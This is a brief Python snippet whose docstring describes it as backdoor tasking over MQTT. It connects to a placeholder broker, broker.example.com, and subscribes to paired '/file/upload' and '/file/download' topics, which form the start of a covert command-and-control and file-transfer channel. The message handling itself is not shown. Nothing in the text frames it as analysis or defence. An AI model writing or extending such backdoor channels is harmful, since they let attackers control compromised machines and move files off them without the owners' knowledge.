"""Backdoor tasking over MQTT paired file-transfer topics."""

import paho.mqtt.client as mqtt

UPLOAD_TOPIC = "/file/upload"
DOWNLOAD_TOPIC = "/file/download"

client = mqtt.Client()
client.connect("broker.example.com", 1883)
client.subscribe(DOWNLOAD_TOPIC)
